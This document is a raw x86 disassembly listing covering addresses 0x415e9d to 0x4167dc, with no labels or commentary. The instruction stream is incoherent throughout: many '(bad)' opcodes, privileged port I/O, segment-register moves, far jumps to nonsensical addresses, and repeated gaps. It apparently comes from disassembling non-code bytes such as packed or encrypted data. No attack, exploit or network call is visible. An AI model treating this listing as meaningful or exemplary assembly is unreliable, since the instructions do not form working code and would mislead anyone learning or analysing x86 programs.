  415e9d:	cs push cs
  415e9f:	bound  esi,QWORD PTR [ebp-0x3b]
  415ea2:	in     eax,dx
  415ea3:	test   eax,0xa8089481
  415ea8:	jno    0x415e44
  415eaa:	push   DWORD PTR [esi+0x15]
  415ead:	mov    WORD PTR [edi-0xb6b6f7a],es
  415eb3:	jmp    0x415eb8
	...
  415ec8:	dec    esi
  415ec9:	aaa    
  415eca:	add    dh,al
  415ecc:	dec    ecx
  415ecd:	or     eax,0x131a603a
  415ed2:	retf   0x4e5
  415ed5:	mov    WORD PTR [edi+0x350c200],es
  415edb:	add    BYTE PTR ds:0x2e06e352,dh
  415ee1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ee2:	lea    edi,[esi]
  415ee4:	scas   al,BYTE PTR es:[edi]
  415ee5:	mov    ds:0x6125e675,eax
  415eea:	pop    es
  415eeb:	add    BYTE PTR [esi+ebp*1+0x4],dh
  415eef:	mov    ebx,DWORD PTR [esi]
  415ef1:	adc    al,0xe7
  415ef3:	aas    
  415ef4:	xor    ebx,DWORD PTR fs:[eax]
  415ef7:	or     DWORD PTR [ebx+0x1b],ebp
  415efa:	adc    BYTE PTR [ecx+0x3f89096],al
  415f00:	cmc    
  415f01:	push   ecx
  415f02:	fild   WORD PTR [esp+ebp*8]
  415f05:	push   es
  415f06:	lea    esi,[edx]
  415f08:	jl     0x415f0e
  415f0a:	xchg   edx,eax
  415f0c:	icebp  
  415f0d:	sbb    edi,DWORD PTR [eax]
  415f0f:	adc    ebx,0xffffffa7
  415f12:	push   DWORD PTR [edx]
  415f14:	ins    BYTE PTR es:[edi],dx
  415f15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f16:	dec    ebp
  415f17:	and    DWORD PTR ds:0x80c9898d,0xe
  415f1e:	add    DWORD PTR [ebp+0x35],0xa527e081
  415f25:	nop
  415f26:	or     BYTE PTR [edi+0x4b],bl
  415f29:	mov    ecx,DWORD PTR [ebp+0xec]
	...
  415f3f:	add    BYTE PTR [eax+0x52],ch
  415f42:	or     al,0x0
  415f44:	cs int 0x2c
  415f47:	add    al,0x3f
  415f49:	in     eax,0x7c
  415f4b:	inc    ecx
  415f4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f4d:	sbb    eax,DWORD PTR [edx]
  415f4f:	mov    DWORD PTR [ebp+0x15],edi
  415f52:	retf   0xf604
  415f55:	push   edi
  415f56:	or     al,0x81
  415f58:	jmp    DWORD PTR [ebx+0x7c]
  415f5b:	inc    ecx
  415f5c:	gs out 0xe6,al
  415f5f:	ret    0x9871
  415f62:	jg     0x415fa8
  415f64:	mov    WORD PTR [ecx+0x69d8ba00],ss
  415f6a:	dec    edx
  415f6b:	add    BYTE PTR [edi],al
  415f6d:	inc    esi
  415f6e:	or     BYTE PTR [edx],0xf
  415f71:	outs   dx,BYTE PTR ds:[esi]
  415f72:	or     eax,0x8a324e81
  415f77:	cli    
  415f78:	cmp    BYTE PTR [edx],cl
  415f7a:	dec    edx
  415f7b:	add    BYTE PTR [esi-0x73fb3855],bh
  415f81:	or     BYTE PTR [edx+0x37fdbce3],al
  415f87:	mov    ecx,edx
  415f89:	xor    eax,0xc8805b80
  415f8e:	ds clc 
  415f90:	pop    esi
  415f91:	sbb    eax,0x2d8c1de1
  415f96:	or     DWORD PTR [eax+0x78],ebp
  415f99:	leave  
  415f9a:	dec    edx
  415f9b:	add    BYTE PTR [ecx],al
  415f9d:	jno    0x415f73
  415f9f:	push   eax
  415fa0:	hlt    
  415fa1:	add    al,0xc
	...
  415fb7:	add    BYTE PTR [esi+edi*2+0x7dd4437f],cl
  415fbe:	in     al,0x70
  415fc0:	mov    WORD PTR ds:0x52155909,gs
  415fc6:	das    
  415fc7:	ret    0x2d94
  415fca:	mov    DWORD PTR ds:[eax-0x67],edx
  415fce:	add    al,0x89
  415fd0:	pop    eax
  415fd1:	push   ecx
  415fd2:	or     eax,0x16dcd87
  415fd7:	mov    dh,0x95
  415fd9:	in     al,dx
  415fda:	jmp    0x4cbf:0x84380518
  415fe1:	dec    edx
  415fe2:	xchg   edi,eax
  415fe3:	pop    es
  415fe4:	dec    ebp
  415fe5:	or     al,0xfc
  415fe7:	or     BYTE PTR [esi+0x4d8706b4],dl
  415fed:	ins    DWORD PTR es:[edi],dx
  415fee:	add    DWORD PTR [esi-0x1adf6b7b],esi
  415ff4:	xchg   esp,eax
  415ff5:	(bad)  
  415ff6:	stc    
  415ff7:	mov    WORD PTR [esi+0x4e87300d],ss
  415ffd:	cwde   
  415ffe:	push   0x7593ccc7
  416003:	call   DWORD PTR [edx-0x333a8763]
  416009:	xchg   ebx,eax
  41600a:	jne    0x416019
  41600c:	sti    
  41600d:	xor    al,0xd7
  41600f:	mov    WORD PTR [esi-0x66bbdff3],es
  416015:	or     bh,al
  416017:	les    eax,FWORD PTR [ebx-0x5c]
  41601a:	jmp    0x0:0xd
	...
  41602d:	add    BYTE PTR [eax],al
  41602f:	add    BYTE PTR [ebx],dl
  416031:	mov    gs,WORD PTR [eax-0x3b]
  416034:	int3   
  416035:	xchg   ebx,eax
  416036:	xor    eax,0xf7354b0d
  41603b:	push   cs
  41603c:	xchg   esi,eax
  41603d:	xchg   ebx,eax
  41603e:	xor    eax,0x68559304
  416043:	push   cs
  416044:	push   ebp
  416045:	push   esi
  416046:	test   DWORD PTR [ebx],0x203b0f3d
  41604c:	xchg   esp,eax
  41604d:	movntps XMMWORD PTR [eax],xmm4
  416050:	mov    BYTE PTR [edi],cl
  416052:	loope  0x416018
  416054:	in     al,0x9b
  416056:	ja     0x41605c
  416058:	mov    ecx,DWORD PTR [edi]
  41605a:	loope  0x416020
  41605c:	mov    ah,0xa3
  41605e:	addr16 add al,0x7b
  416061:	psraw  mm0,mm4
  416064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416065:	mov    esi,DWORD PTR [edi+0x4]
  416068:	imul   ecx,DWORD PTR ds:0x640b44ba,0x62
  41606f:	lds    edx,FWORD PTR [eax-0x727420f1]
  416075:	psraw  mm0,mm4
  416078:	je     0x416017
  41607a:	ja     0x416080
  41607c:	ret    
  41607d:	or     eax,0x2d50eb08
  416082:	sbb    BYTE PTR [ecx-0x78],ah
  416085:	add    DWORD PTR [ecx+0x2d50eb],0x81818871
  41608f:	sti    
  416090:	pop    es
  416091:	gs sub al,0x0
	...
  4160a5:	add    BYTE PTR [eax],al
  4160a7:	add    BYTE PTR [edx+0x7ce90056],dl
  4160ad:	sbb    ebx,ebp
  4160af:	push   0x2b
  4160b1:	xchg   ecx,eax
  4160b2:	pop    ecx
  4160b3:	lahf   
  4160b4:	jle    0x4160c1
  4160b6:	dec    ebx
  4160b7:	fld    QWORD PTR [edx]
  4160b9:	out    0x0,al
  4160bb:	jb     0x4160de
  4160bd:	or     eax,0xda12f143
  4160c2:	or     al,0x60
  4160c4:	loop   0x4160c7
  4160c6:	loope  0x4160ad
  4160c8:	js     0x416115
  4160ca:	xchg   DWORD PTR [edx],ecx
  4160cc:	xchg   esi,eax
  4160cd:	pop    DWORD PTR ds:0x7f6998ee
  4160d3:	pop    ss
  4160d4:	sar    BYTE PTR [edx],1
  4160d6:	or     al,0xb8
  4160d8:	fstp   DWORD PTR [ecx]
  4160da:	fisubr WORD PTR [eax-0x50c85b0a]
  4160e0:	pop    ss
  4160e1:	inc    esp
  4160e2:	xchg   edx,ecx
  4160e4:	mov    ch,0x3f
  4160e6:	or     cl,ch
  4160e8:	jle    0x416153
  4160ea:	jg     0x416093
  4160ec:	iret   
  4160ed:	cmp    bl,BYTE PTR [eax]
  4160ef:	clc    
  4160f0:	fstp   DWORD PTR [ecx]
  4160f2:	(bad)  
  4160f3:	test   al,0xa6
  4160f5:	xchg   esi,eax
  4160f6:	aaa    
  4160f7:	xchg   edi,eax
  4160f8:	pop    es
  4160f9:	inc    esp
  4160fa:	xchg   DWORD PTR [edx-0x25c67c7f],ecx
  416100:	jle    0x416160
  416102:	jg     0x4160bb
  416104:	iret   
  416105:	cmp    cl,BYTE PTR [edx]
  416107:	fdivr  DWORD PTR [esi+0xc619]
	...
  41611d:	add    BYTE PTR [eax],al
  41611f:	add    BYTE PTR [esi+ebp*1],dh
  416122:	add    BYTE PTR [ecx],dh
  416124:	sbb    ecx,DWORD PTR ds:0x5b0681f7
  41612a:	or     bh,bh
  41612c:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41612e:	ror    BYTE PTR [ecx+0x8ee55d3],cl
  416134:	test   BYTE PTR [esi-0x73],cl
  416137:	jne    0x4160fa
  416139:	xchg   ebp,eax
  41613a:	dec    BYTE PTR [ebx-0x104a96c0]
  416140:	xor    bl,BYTE PTR [eax]
  416142:	jmp    0x416145
  416144:	mov    esp,0xacf90d65
  416149:	push   es
  41614a:	and    eax,0x7567acce
  41614f:	jecxz  0x416110
  416151:	repnz mov eax,ds:0x24ff44aa
  416157:	fnstenv [eax+0x5a891aa4]
  41615d:	push   ebp
  41615e:	jecxz  0x41617f
  416160:	jbe    0x416195
  416162:	cmc    
  416163:	mov    BYTE PTR [edi],al
  416165:	mov    ?,edx
  416167:	(bad)  
  416168:	sub    BYTE PTR [ebp+0x0],bl
  41616b:	add    ch,ah
  41616d:	xchg   esp,eax
  41616e:	(bad)  
  41616f:	into   
  416170:	xor    al,0x33
  416172:	adc    al,0x89
  416174:	xor    dl,BYTE PTR [esi-0x1d]
  416177:	add    al,0x6c
  416179:	push   0x536cfb0d
  41617e:	xchg   eax,eax
  416180:	mov    ecx,0x8916a7
	...
  416195:	add    BYTE PTR [eax],al
  416197:	add    BYTE PTR [ebx],ah
  416199:	sbb    dh,ch
  41619b:	aas    
  41619c:	cs xchg ecx,eax
  41619e:	mov    ecx,0x8d561fc
  4161a3:	mov    edx,edx
  4161a5:	push   ebp
  4161a6:	jecxz  0x4161ae
  4161a8:	xor    al,0x34
  4161aa:	hlt    
  4161ab:	add    BYTE PTR [ebx+ebp*1+0xedb0909],cl
  4161b2:	push   ebx
  4161b3:	aas    
  4161b4:	mov    esp,es
  4161b6:	mov    al,0xbf
  4161b8:	jae    0x4161ea
  4161ba:	mov    ah,ch
  4161bc:	js     0x4161ec
  4161be:	or     DWORD PTR [eax],eax
  4161c0:	xchg   DWORD PTR [esi+0x2dcd78dd],eax
  4161c6:	sbb    ch,0x4d
  4161c9:	iret   
  4161ca:	idiv   DWORD PTR [esi+0x73]
  4161cd:	jmp    0xfc98:0x328c0009
  4161d4:	ret    0x8ec
  4161d7:	xchg   DWORD PTR [ecx+0xfc68289],edi
  4161dd:	outs   dx,BYTE PTR ds:[esi]
  4161de:	cmc    
  4161df:	xchg   BYTE PTR [edi+0x3b],al
  4161e2:	out    dx,eax
  4161e3:	xchg   BYTE PTR [edx-0x55],cl
  4161e6:	out    0x3d,eax
  4161e8:	pop    ss
  4161e9:	push   0xffffff86
  4161eb:	cld    
  4161ec:	cdq    
  4161ed:	in     al,dx
  4161ee:	or     BYTE PTR [ecx],cl
  4161f0:	cdq    
  4161f1:	test   eax,0xa6cddd82
  4161f6:	pop    es
  4161f7:	jg     0x4161e4
  4161f9:	inc    ecx
  4161fa:	or     al,BYTE PTR [eax]
	...
  416210:	mov    WORD PTR [edx],?
  416212:	cwde   
  416213:	cld    
  416214:	ja     0x416202
  416216:	or     BYTE PTR [edi+0xeececcb],al
  41621c:	or     eax,0x8c00d057
  416221:	sub    eax,0xe4d0b502
  416226:	dec    ebx
  416227:	add    BYTE PTR ds:0x9aedcaf7,dl
  41622d:	lods   al,BYTE PTR ds:[esi]
  41622e:	aad    0xfc
  416230:	mov    WORD PTR ds:0xf1fb0909,gs
  416236:	inc    esp
  416237:	aas    
  416238:	mov    WORD PTR [eax+edx*8-0x5f98f42f],ss
  41623f:	fidivr WORD PTR [eax+0xd]
  416242:	mov    dh,0xc5
  416244:	mov    eax,ds:0x93d36898
  416249:	cmp    edi,DWORD PTR [eax-0x42]
  41624c:	or     eax,0x9a12eb54
  416251:	or     eax,0x7f6a839d
  416256:	push   0x10
  416258:	pop    ds
  416259:	inc    eax
  41625a:	jmp    0x4162a0
  41625c:	mov    WORD PTR ds:0x9669c536,cs
  416262:	pusha  
  416263:	fist   WORD PTR [eax-0x6c]
  416266:	fild   WORD PTR [ebx]
  416268:	xchg   ebp,eax
  416269:	pop    es
  41626a:	dec    ebx
  41626b:	pop    edx
  41626c:	adc    DWORD PTR [eax+edi*2-0x12d10449],0xffffff84
	...
  416288:	sub    DWORD PTR [eax-0x21],eax
  41628b:	add    ecx,DWORD PTR [ebx+ecx*4-0x2a5b27aa]
  416292:	fisttp WORD PTR [ecx+edi*1-0x6d11f1ab]
  416299:	aaa    
  41629a:	add    eax,DWORD PTR [esp+ecx*4]
  41629d:	xchg   esp,eax
  41629e:	cli    
  41629f:	mov    es,WORD PTR [eax]
  4162a1:	(bad)  
  4162a2:	mov    al,ds:0xf3c91303
  4162a7:	mov    edx,cs
  4162a9:	adc    bl,BYTE PTR [edi]
  4162ab:	add    BYTE PTR [ebx],dl
  4162ad:	arpl   WORD PTR [edx],dx
  4162af:	test   BYTE PTR [edx],0x5e
  4162b2:	(bad)  
  4162b3:	fstp   QWORD PTR [ecx-0x2f6eecf5]
  4162b9:	shl    BYTE PTR [eax],0x4
  4162bc:	xchg   ebp,eax
  4162bd:	leave  
  4162be:	mov    bl,0x8c
  4162c0:	loope  0x416316
  4162c2:	(bad)  
  4162c3:	std    
  4162c4:	cmp    dh,BYTE PTR [edi]
  4162c6:	or     BYTE PTR [ebp-0x1df76b71],dh
  4162cc:	sbb    al,BYTE PTR [eax+0x71]
  4162cf:	sub    BYTE PTR [eax-0x4d572ae9],cl
  4162d5:	lea    eax,[edi+0x893bb8e]
  4162db:	jmp    0x1356a76
  4162e0:	leave  
  4162e1:	xchg   esp,eax
  4162e2:	jg     0x416282
  4162e4:	push   eax
  4162e5:	xor    BYTE PTR [esi],bl
  4162e7:	push   0xe9084152
	...
  416300:	(bad)  
  416301:	mov    edi,DWORD PTR [ebp+0x87dd265]
  416307:	sbb    BYTE PTR [ecx+0x40],al
  41630a:	inc    ebx
  41630b:	push   ecx
  41630c:	push   cs
  41630d:	mov    edx,0x1192e9f0
  416312:	mov    eax,ds:0x7f405a47
  416317:	xor    DWORD PTR [eax+0x35],edx
  41631a:	adc    eax,0xe64e4960
  41631f:	pusha  
  416320:	push   eax
  416321:	xchg   esi,eax
  416322:	div    DWORD PTR [eax-0x21]
  416325:	ins    DWORD PTR es:[edi],dx
  416326:	shl    BYTE PTR [eax+0x4e],0xbe
  41632a:	jmp    0xa22c4872
  41632f:	fadd   DWORD PTR [ebp+0x6e]
  416332:	iret   
  416333:	jo     0x416374
  416335:	(bad)  
  416336:	out    0xde,eax
  416338:	or     BYTE PTR [edi-0x29],ah
  41633b:	pop    es
  41633c:	add    BYTE PTR [ebx-0x1],dl
  41633f:	cli    
  416340:	pop    ss
  416341:	gs (bad) 
  416343:	rcl    DWORD PTR [eax-0x328f3f93],1
  416349:	mov    ebp,0x3f88d6e9
  41634e:	or     BYTE PTR [eax],bl
  416350:	pop    es
  416351:	push   ss
  416352:	rol    BYTE PTR [eax],1
  416354:	hlt    
  416355:	cmp    BYTE PTR [eax],al
  416357:	xor    edi,esp
  416359:	or     eax,ebx
  41635b:	ror    ebp,0x92
  41635e:	and    eax,0x75532cc8
  416363:	jecxz  0x416365
	...
  416375:	add    BYTE PTR [eax],al
  416377:	add    dh,al
  416379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41637a:	aaa    
  41637b:	xor    esi,DWORD PTR [edx+edi*8+0x38e4d88c]
  416382:	or     dh,BYTE PTR [ecx]
  416384:	aaa    
  416385:	or     eax,eax
  416387:	rcr    DWORD PTR ds:0xfcd02648,0x53
  41638e:	jne    0x416373
  416390:	cli    
  416391:	or     BYTE PTR [bx+si],al
  416394:	and    al,0xfb
  416396:	mov    eax,ds
  416398:	mov    ah,0x38
  41639a:	sbb    BYTE PTR [ecx],dh
  41639c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41639d:	or     eax,eax
  41639f:	ror    ebp,0x94
  4163a2:	and    eax,0x7553acd0
  4163a7:	jecxz  0x4163e3
  4163a9:	cwde   
  4163aa:	add    ecx,DWORD PTR [edi]
  4163ac:	xor    al,0xfb
  4163ae:	jle    0x4163f5
  4163b0:	sub    eax,0x2404e752
  4163b5:	dec    esp
  4163b6:	lea    ebx,[eax]
  4163b8:	mov    dh,0x7d
  4163ba:	add    BYTE PTR [esi+ebx*4],al
  4163bd:	jge    0x4163bf
  4163bf:	mov    DWORD PTR ds:0x6c5b5688,edx
  4163c5:	sub    al,0x51
  4163c7:	ret    0x90fd
  4163ca:	push   edi
  4163cb:	push   esi
  4163cc:	jle    0x41644a
  4163ce:	sub    al,0xc
  4163d0:	add    ecx,DWORD PTR [esp+edi*2]
  4163d3:	and    al,0xc5
  4163d5:	fimul  WORD PTR [ecx-0x3a53250a]
  4163db:	sldt   WORD PTR [eax]
	...
  4163ee:	add    BYTE PTR [eax],al
  4163f0:	add    edx,DWORD PTR [edx+0x3]
  4163f3:	mov    bh,0x8c
  4163f5:	jmp    0x41642f
  4163f7:	mov    ecx,DWORD PTR [edi+0x33]
  4163fa:	cmp    eax,ebp
  4163fc:	pop    ecx
  4163fd:	push   ecx
  4163fe:	fdiv   st(5),st
  416400:	and    al,0xff
  416402:	inc    esp
  416403:	aas    
  416404:	mov    WORD PTR [ebx+0x0],ss
  416407:	cld    
  416408:	stos   DWORD PTR es:[edi],eax
  416409:	in     eax,dx
  41640a:	or     esi,DWORD PTR [ebp-0x17c88366]
  416410:	dec    ebp
  416411:	icebp  
  416412:	(bad)  
  416414:	and    al,0xa7
  416416:	inc    ebp
  416417:	aas    
  416418:	mov    WORD PTR ds:0x1383f9c4,ss
  41641e:	cmp    ebx,DWORD PTR [ecx+0x4e]
  416421:	inc    esi
  416422:	or     DWORD PTR [ebx+0x5],edx
  416425:	or     DWORD PTR [ecx],edi
  416427:	push   eax
  416428:	mov    edi,0x170836b6
  41642d:	push   ecx
  41642e:	or     eax,0x37b5c18b
  416433:	push   eax
  416434:	fs icebp 
  416436:	fdiv   st(5),st
  416438:	dec    ebx
  416439:	push   esi
  41643a:	pop    ebp
  41643b:	je     0x41640a
  41643d:	sub    eax,0x1e34438e
  416442:	loope  0x416439
  416444:	xor    BYTE PTR [ebx+0x22868dc],al
  41644a:	dec    edx
  41644b:	add    BYTE PTR [ecx],dl
  41644d:	jmp    0xa565b522
  416452:	(bad)  
	...
  416468:	adc    edx,DWORD PTR [esi]
  41646a:	pop    ebp
  41646b:	jae    0x4164ba
  41646d:	sub    eax,0x1e04438e
  416472:	loope  0x41644d
  416474:	clc    
  416475:	cmp    bl,cl
  416477:	push   ecx
  416478:	add    ecx,ebp
  41647a:	rcl    BYTE PTR [eax-0xc],1
  41647d:	scas   eax,DWORD PTR es:[edi]
  41647e:	(bad)  
  416480:	jecxz  0x416416
  416482:	dec    edx
  416483:	jge    0x41646d
  416485:	fldenv [ecx+0x68e0d3fc]
  41648b:	jmp    0x37308d9d
  416490:	pop    edx
  416491:	cvttps2pi mm7,xmm4
  416494:	add    al,0xc2
  416496:	jecxz  0x416418
  416498:	dec    edi
  416499:	cmp    al,0xf
  41649b:	aaa    
  41649c:	mov    ah,0x3e
  41649e:	mov    edx,0x2409a1d3
  4164a3:	aam    0x3c
  4164a5:	pop    ss
  4164a6:	mov    ds:0x8c2c3cfc,al
  4164ab:	iret   
  4164ac:	mov    DWORD PTR [ebx],edi
  4164ae:	pop    es
  4164af:	push   eax
  4164b0:	clc    
  4164b1:	aad    0xdf
  4164b3:	or     bh,0x3c
  4164b6:	paddusb mm3,QWORD PTR [ecx]
  4164b9:	cmp    BYTE PTR [esi-0x2d],bh
  4164bc:	hlt    
  4164bd:	mov    eax,0x98c44fb
  4164c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164c3:	sar    DWORD PTR [esp+ebp*1+0x3b51d078],cl
  4164ca:	push   0x31
	...
  4164e0:	dec    eax
  4164e1:	shrd   ebx,edx,0xb
  4164e5:	ror    DWORD PTR [ebx+0x7d],1
  4164e8:	xlat   BYTE PTR ds:[ebx]
  4164e9:	inc    esp
  4164ea:	xlat   BYTE PTR ds:[ebx]
  4164eb:	iret   
  4164ec:	mov    eax,0xcf80dfd5
  4164f1:	cmp    al,0x8f
  4164f3:	(bad)  [ecx-0x5b2cd1c8]
  4164f9:	cmp    BYTE PTR [ebx-0x5bf673bc],bl
  4164ff:	rcr    DWORD PTR [esp+ebp*1-0x80],cl
  416503:	iret   
  416504:	add    DWORD PTR [ebx],edi
  416506:	jp     0x416539
  416508:	clc    
  416509:	push   cs
  41650a:	lods   al,BYTE PTR ds:[esi]
  41650b:	ror    DWORD PTR [ebx],cl
  41650d:	ror    DWORD PTR [eax],1
  41650f:	cmc    
  416510:	push   0x5381f8df
  416515:	mov    DWORD PTR [edi-0x17],0x39f0d70c
  41651c:	mov    al,0xd0
  41651e:	hlt    
  41651f:	(bad)  
  416520:	fisubr WORD PTR [ebx-0x6bb6ab8c]
  416526:	sub    DWORD PTR [eax+eiz*8],0xffffffe3
  41652a:	loopne 0x41652c
  41652c:	fdivr  QWORD PTR [eax]
  41652e:	cmc    
  41652f:	pop    ds
  416530:	or     eax,0xc019f0d7
  416535:	xor    esi,ecx
  416537:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416538:	mov    esi,0x55f1ce14
  41653d:	cmovnp ebx,DWORD PTR [ecx-0x6d26d341]
	...
  416558:	pop    esi
  416559:	cmp    BYTE PTR [esi+0x22],dl
  41655c:	stc    
  41655d:	sub    BYTE PTR [ebx-0x55],dl
  416560:	ja     0x41659c
  416562:	pop    esp
  416563:	pusha  
  416564:	je     0x416520
  416566:	in     al,0x5d
  416568:	mov    BYTE PTR [eax+ecx*1-0x7e206a46],dl
  41656f:	mov    esp,0xe57b0d57
  416574:	or     al,0x16
  416576:	mov    BYTE PTR [edi+0x5e],cl
  416579:	cmp    BYTE PTR [eax+0x51],bl
  41657c:	sbb    al,0x3a
  41657e:	cmc    
  41657f:	jmp    0x35a1fa55
  416584:	les    edi,FWORD PTR [ecx+0x8]
  416587:	inc    ecx
  416588:	cwde   
  416589:	cmp    dh,ch
  41658b:	and    BYTE PTR es:[esi-0x7e],0x6b
  416590:	inc    ebx
  416591:	mov    BYTE PTR [edi-0x17],0x87
  416595:	nop
  416596:	cmp    ch,BYTE PTR [ebx+0x3f0a]
  41659c:	adc    DWORD PTR [ecx-0x35],esp
  41659f:	test   DWORD PTR ds:0xf4fff364,ecx
  4165a5:	xchg   ebp,eax
  4165a6:	or     BYTE PTR [eax],al
  4165a8:	mov    es,WORD PTR [ecx+0x115cf08d]
  4165ae:	jl     0x4165ae
  4165b0:	mov    dl,0x63
  4165b2:	and    eax,0x7fa0ced2
  4165b7:	test   DWORD PTR [ecx+0x66],ebx
  4165ba:	repz inc DWORD PTR [eax]
	...
  4165cd:	add    BYTE PTR [eax],al
  4165cf:	add    BYTE PTR [ecx+edx*1],bh
  4165d2:	je     0x4165d2
  4165d4:	repnz arpl bx,si
  4165d7:	test   DWORD PTR [ecx+0x66],ebp
  4165da:	repz jmp FWORD PTR [esi]
  4165dd:	mov    ecx,0x63f2fe74
  4165e2:	add    edi,DWORD PTR [esi+0x7fe810a6]
  4165e8:	out    dx,al
  4165e9:	or     DWORD PTR [esi+edi*8+0x12],esi
  4165ed:	arpl   WORD PTR [ebx],ax
  4165ef:	mov    dh,0x52
  4165f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165f2:	lock mov BYTE PTR [ebx+ecx*2+0x7],ah
  4165f7:	add    BYTE PTR [esi+0x6dfa87d2],dh
  4165fd:	retf   0x8009
  416600:	scas   al,BYTE PTR es:[edi]
  416601:	nop
  416602:	jns    0x4165ca
  416604:	sbb    edi,DWORD PTR [ebx-0x20]
  416607:	imul   esp,ebx,0x63
  41660a:	repz or DWORD PTR [eax],0xffffffc8
  41660e:	idiv   bh
  416610:	rcl    BYTE PTR [eax-0x1ddac478],cl
  416616:	stos   DWORD PTR es:[edi],eax
  416617:	and    DWORD PTR [eax+0x72fff6c8],0xffffff90
  41661e:	jns    0x4165be
  416620:	mov    al,ds:0x72fe8811
  416625:	arpl   WORD PTR [eax-0x18],bx
  416628:	mov    WORD PTR [edx],cs
  41662a:	or     al,BYTE PTR [eax]
  41662c:	mov    edx,gs
  41662e:	ss pop ecx
  416630:	add    eax,0xc2259f
	...
  416645:	add    BYTE PTR [eax],al
  416647:	add    BYTE PTR [ebx+ebp*1-0x540e78c2],al
  41664e:	call   0x96cf3df
  416653:	push   ecx
  416654:	inc    edx
  416655:	jp     0x4166ca
  416657:	pop    ebx
  416658:	test   dh,al
  41665a:	pop    esi
  41665b:	or     al,0x19
  41665d:	test   al,0x89
  41665f:	inc    bl
  416661:	dec    ecx
  416662:	cmp    eax,ebp
  416664:	mov    ebx,0x2600092a
  416669:	sub    edx,DWORD PTR [ecx-0x4]
  41666c:	and    DWORD PTR [esp+ecx*1-0x18],ebp
  416670:	mov    edi,0x5dfdd7e7
  416675:	std    
  416676:	jb     0x4165fa
  416678:	nop
  416679:	lahf   
  41667a:	dec    ecx
  41667b:	add    BYTE PTR [edx+ebp*1],dl
  41667e:	sbb    eax,DWORD PTR [edx+0xf]
  416681:	and    al,0xf9
  416683:	jnp    0x416702
  416685:	out    0x8d,eax
  416687:	js     0x4166fb
  416689:	mov    bh,0xd8
  41668b:	jmp    FWORD PTR [ebx+0x2e]
  41668e:	or     ecx,ebp
  416690:	mov    eax,0x1187d9b4
  416695:	pop    edx
  416696:	xlat   BYTE PTR ds:[ebx]
  416697:	std    
  416698:	push   ebx
  416699:	popf   
  41669a:	mov    esi,0x8eb27ce9
  41669f:	je     0x4166e3
  4166a1:	(bad)  
  4166a2:	fadd   DWORD PTR [edi-0x228adef]
  4166a8:	xor    esi,DWORD PTR [edi-0x72]
  4166ab:	je     0x4166ad
	...
  4166bd:	add    BYTE PTR [eax],al
  4166bf:	add    BYTE PTR [edx],ch
  4166c1:	jg     0x41669b
  4166c3:	mov    DWORD PTR [ecx],edx
  4166c5:	jmp    0x91fe:0x951bfdd6
  4166cc:	lea    edx,[ebx]
  4166ce:	dec    DWORD PTR [edi+0x15]
  4166d1:	cli    
  4166d2:	call   0xb999:0xd63801d1
  4166d9:	test   DWORD PTR [edi],eax
  4166db:	jnp    0x4166d0
  4166dd:	push   ecx
  4166de:	loop   0x4166e3
  4166e0:	dec    ebp
  4166e1:	shl    BYTE PTR [edx-0x33],cl
  4166e4:	jl     0x41669f
  4166e6:	in     al,dx
  4166e7:	adc    DWORD PTR [ebp+0x3ac65494],0xffffffde
  4166ee:	xlat   BYTE PTR ds:[ebx]
  4166ef:	into   
  4166f0:	(bad)  
  4166f1:	aaa    
  4166f2:	fiadd  WORD PTR [ebx-0x303a4311]
  4166f8:	mov    ecx,0x8c0b5f94
  4166fd:	ror    DWORD PTR [esi-0x4243187d],0xcf
  416704:	mov    eax,ds:0x76e3c94
  416709:	adc    bl,BYTE PTR [edi-0x32]
  41670c:	xchg   ecx,eax
  41670d:	aaa    
  41670e:	das    
  41670f:	fdiv   QWORD PTR [ebx]
  416711:	xchg   esp,eax
  416712:	fild   WORD PTR [ebx]
  416714:	loope  0x4166ec
  416716:	cmp    bh,BYTE PTR [ebp+0x68]
  416719:	fldenv [ecx+0x1de273fc]
  41671f:	aaa    
  416720:	adc    eax,0xf3c3d0
	...
  416735:	add    BYTE PTR [eax],al
  416737:	add    cl,ch
  416739:	or     eax,DWORD PTR [ebx]
  41673b:	sub    BYTE PTR [eax-0x20549b52],al
  416741:	mov    edi,DWORD PTR [eax-0x3a]
  416744:	pop    ss
  416745:	mov    esp,0x950665ef
  41674a:	(bad)  
  41674c:	test   BYTE PTR [ecx],cl
  41674e:	scas   eax,DWORD PTR es:[edi]
  41674f:	repz or cl,BYTE PTR [edi-0x33]
  416753:	adc    al,0x3e
  416755:	xchg   DWORD PTR [eax],ecx
  416757:	jle    0x416737
  416759:	loope  0x4166e4
  41675b:	sub    DWORD PTR [eax],ebx
  41675d:	(bad)  
  41675e:	loopne 0x4167cd
  416760:	cmp    edi,DWORD PTR [ecx]
  416762:	cmc    
  416763:	xchg   ecx,eax
  416764:	fstp   TBYTE PTR [edi+0x79e7e947]
  41676a:	out    dx,eax
  41676b:	push   cs
  41676c:	retf   
  41676d:	mov    BYTE PTR [ebp-0x1f1e40de],bh
  416773:	jns    0x416737
  416775:	cmp    ch,dh
  416777:	adc    DWORD PTR [ebx-0x3d],0x6db7e947
  41677e:	out    dx,eax
  41677f:	out    0xc2,al
  416781:	mov    BYTE PTR [ebp-0x1f21813e],bh
  416787:	xor    eax,0x2ef538db
  41678c:	push   0xffffffdd
  41678e:	retf   0x8ff1
  416791:	in     eax,0x81
  416793:	sbb    eax,0xc1598c74
  416798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416799:	cmp    eax,0xaef5
	...
  4167ae:	add    BYTE PTR [eax],al
  4167b0:	adc    BYTE PTR [ebp-0x78],dl
  4167b3:	jmp    0x9df1fc47
  4167b8:	jecxz  0x41682f
  4167ba:	or     BYTE PTR [edx+0x7f],ah
  4167bd:	nop    DWORD PTR [edx+0x4f]
  4167c1:	xchg   ecx,eax
  4167c2:	mov    DWORD PTR [edx-0xb8b8675],ebp
  4167c8:	rcl    BYTE PTR [edx+edi*2+0x7bb91786],1
  4167cf:	sub    BYTE PTR [eax+0x5e70180b],dl
  4167d5:	adc    eax,0x540ee5c8
  4167da:	or     al,0x14
  4167dc:	pop    esp
